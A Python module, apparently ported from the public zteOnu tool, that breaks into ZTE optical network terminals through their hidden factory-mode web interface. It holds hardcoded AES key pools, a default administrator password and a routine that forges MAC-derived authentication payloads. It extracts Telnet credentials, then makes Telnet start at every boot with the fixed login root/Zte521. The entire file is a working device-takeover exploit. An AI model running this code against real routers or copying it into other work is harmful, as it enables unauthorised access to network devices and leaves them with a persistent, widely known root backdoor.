# -*- coding: utf-8 -*-
"""中兴系 webFac 工厂模式 —— 开启 Telnet 并取得登录凭据。

协议来源：对 zteOnu (github.com/idrnyu/zteOnu) 的公开实现做 Python 移植。
流程：
    1. POST webFac      SendSq.gch                 复位
    2. POST webFac      RequestFactoryMode.gch     申请工厂模式
    3. POST webFac      SendSq.gch?rand=<秒>        取版本与密钥
    4. POST webFacEntry AES(CheckLoginAuth.gch...)  认证
       （version=2 时先发 SendInfo.gch，payload 由本机 MAC 反推）
    5. POST webFacEntry AES(FactoryMode.gch...)     返回 telnet 账号密码
"""
import hashlib
import re
import time
import urllib.error

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from .core import Http, Telnet, log

# ── 密钥池（来自公开实现，96 字节） ──
AES_KEY_POOL = bytes([
    0x7B, 0x56, 0xB0, 0xF7, 0xDA, 0x0E, 0x68, 0x52, 0xC8, 0x19,
    0xF3, 0x2B, 0x84, 0x90, 0x79, 0xE5, 0x62, 0xF8, 0xEA, 0xD2,
    0x64, 0x93, 0x87, 0xDF, 0x73, 0xD7, 0xFB, 0xCC, 0xAA, 0xFE,
    0x75, 0x43, 0x1C, 0x29, 0xDF, 0x4C, 0x52, 0x2C, 0x6E, 0x7B,
    0x45, 0x3D, 0x1F, 0xF1, 0xDE, 0xBC, 0x27, 0x85, 0x8A, 0x45,
    0x91, 0xBE, 0x38, 0x13, 0xDE, 0x67, 0x32, 0x08, 0x54, 0x11,
    0x75, 0xF4, 0xD3, 0xB4, 0xA4, 0xB3, 0x12, 0x86, 0x67, 0x23,
    0x99, 0x4C, 0x61, 0x7F, 0xB1, 0xD2, 0x30, 0xDF, 0x47, 0xF1,
    0x76, 0x93, 0xA3, 0x8C, 0x95, 0xD3, 0x59, 0xBF, 0x87, 0x8E,
    0xF3, 0xB3, 0xE4, 0x76, 0x49, 0x88,
])

AES_KEY_POOL_NEW = bytes([
    0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
    0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
    0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
    0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
    0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
    0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
    0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
    0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
    0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
    0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99,
])

MOD, EXP = 0x9E9, 0x4F8 - 1   # 2537, 1271


# ─────────────────────────── 加解密 ───────────────────────────
def _pad(b):
    return b + b"\x00" * ((16 - len(b) % 16) % 16)


def ecb_encrypt(data: bytes, key: bytes) -> bytes:
    enc = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    return enc.update(_pad(data)) + enc.finalize()


def ecb_decrypt(data: bytes, key: bytes) -> bytes:
    if len(data) % 16:
        data = _pad(data)
    dec = Cipher(algorithms.AES(key), modes.ECB()).decryptor()
    return (dec.update(data) + dec.finalize()).rstrip(b"\x00")


def key_pool(version: int, r: int, new_r: int = 0) -> bytes:
    idx, pool = r, AES_KEY_POOL
    if version == 2:
        idx = ((0x1000193 * r) & 0x3F ^ new_r) % 60
        pool = AES_KEY_POOL_NEW
    return bytes((b ^ 0xA5) & 0xFF for b in pool[idx:idx + 24])


# ────────────────────── SendInfo 魔数 payload ──────────────────────
def power(w: int) -> int:
    w %= MOD
    acc = 1
    e = EXP
    while e:
        if e & 1:
            acc = (acc * w) % MOD
        w = (w * w) % MOD
        e >>= 1
    return acc & 0xFF


_REV = {}
for _v in range(MOD):
    _REV.setdefault(power(_v), _v)


def magic_bytes(mac: bytes) -> bytes:
    """把 6 字节 MAC 编码成 46 字节 SendInfo payload。"""
    vals = [_REV[b] for b in mac] + [0] * 6
    out = bytearray()
    for v in vals[:11]:
        out += bytes([v & 0xFF, (v >> 8) & 0xFF, 0, 0])
    out += bytes([vals[11] & 0xFF, (vals[11] >> 8) & 0xFF])
    return bytes(out)


def verify_payload(payload: bytes, mac: bytes) -> bool:
    """复刻设备端校验，用于自测。"""
    check = bytearray()
    for k in range(12):
        w = 0
        for i in range(4):
            idx = 4 * k + i
            if idx < len(payload):
                w |= payload[idx] << (8 * i)
        check.append(power(w))
    return mac in [bytes(check[i:i + 6]) for i in range(0, 12, 6)]


# ─────────────────────────── 主流程 ───────────────────────────
class Factory:
    def __init__(self, ip, port=8080, user="telecomadmin", password="nE7jA%5m", timeout=8):
        self.ip, self.port = ip, port
        self.user, self.password = user, password
        self.http = Http("http://%s:%d" % (ip, port), timeout=timeout)
        self.key = b""

    def _post_web(self, body):
        return self.http.post("/webFac", body)

    def _post_entry(self, plain: bytes):
        return self.http.post("/webFacEntry", ecb_encrypt(plain, self.key), raw=True)

    def reset(self):
        try:
            self.http.get("/")
        except Exception:
            raise RuntimeError("HTTP 不可达：%s:%d" % (self.ip, self.port))
        try:
            _, st = self._post_web("SendSq.gch")
        except urllib.error.HTTPError as e:
            raise RuntimeError("webFac 返回 %d —— 该设备可能不是中兴系，或端口不是 %d"
                               % (e.code, self.port))
        return st in (200, 400)

    def request_factory_mode(self):
        try:
            self._post_web("RequestFactoryMode.gch")
        except Exception:
            pass
        return True

    def send_sq(self):
        r = time.localtime().tm_sec
        body, st = self._post_web("SendSq.gch?rand=%d\r\n" % r)
        if st != 200 and st != 401:
            return None
        if "newrand" in body:
            ver = 2
            new_rand = int(re.sub(r"[^0-9]", "", body.replace("newrand=", "")) or 0)
            self.key = key_pool(ver, r, new_rand)
        elif body == "":
            ver = 1
            self.key = key_pool(ver, r, 0)
        else:
            return None
        return ver

    def check_login_auth(self):
        cmd = "CheckLoginAuth.gch?&version61&user=%s&pass=%s" % (self.user, self.password)
        resp, st = self._post_entry(cmd.encode())
        if st == 401:
            raise RuntimeError("工厂模式账号密码错误（%s/%s）" % (self.user, self.password))
        if st == 400:
            raise RuntimeError("设备拒绝（400）")
        return True

    def send_info(self, mac_candidates):
        for mac in mac_candidates:
            payload = b"SendInfo.gch?info=12|" + magic_bytes(mac)
            resp, st = self._post_entry(payload)
            if st == 200:
                return True
            log("DEBUG", "MAC %s 被拒（%d）" % (":".join("%02x" % b for b in mac), st))
        raise RuntimeError("所有本机 MAC 均被拒绝")

    def factory_mode(self):
        resp, _ = self._post_entry(b"FactoryMode.gch?mode=2&user=notused")
        plain = ecb_decrypt(resp, self.key).decode("utf-8", "replace")
        u = re.search(r"user=([^&\s]+)", plain)
        p = re.search(r"pass=([^&\s]+)", plain)
        return (u.group(1) if u else None, p.group(1) if p else None)

    def run(self, macs):
        log("INFO", "目标 %s:%d  工厂账号 %s" % (self.ip, self.port, self.user))
        log("STEP", "[0] 复位 webFac")
        if not self.reset():
            raise RuntimeError("webFac 无响应，可能不是中兴系或端口不对")
        log("STEP", "[1] 申请工厂模式")
        self.request_factory_mode()
        log("STEP", "[2] SendSq 握手")
        ver = self.send_sq()
        if ver is None:
            raise RuntimeError("SendSq 返回异常")
        log("STEP", "    版本 = %d，密钥已派生" % ver)
        log("STEP", "[3] 认证")
        if ver == 2:
            self.send_info(macs)
        self.check_login_auth()
        log("STEP", "[4] 进入工厂模式")
        user, pw = self.factory_mode()
        if not user:
            raise RuntimeError("未解析到 telnet 凭据")
        log("DATA", "Telnet 账号 %s / %s" % (user, pw))
        return user, pw


def enable_permanent_telnet(ip, user, pw, port=23):
    """登录 telnet 后写入 TelnetCfg，使 Telnet 开机自启。"""
    t = Telnet(ip, port)
    if not t.login(user, [pw]):
        t.close()
        raise RuntimeError("Telnet 登录失败")
    cmds = [
        "sendcmd 1 DB set TelnetCfg 0 Lan_Enable 1",
        "sendcmd 1 DB set TelnetCfg 0 TSLan_UName root",
        "sendcmd 1 DB set TelnetCfg 0 TSLan_UPwd Zte521",
        "sendcmd 1 DB set TelnetCfg 0 Max_Con_Num 3",
        "sendcmd 1 DB set TelnetCfg 0 InitSecLvl 3",
        "sendcmd 1 DB save",
    ]
    for c in cmds:
        log("SHELL", c)
        t.send(c)
        t.read_for(0.5)
    t.close()
    return True
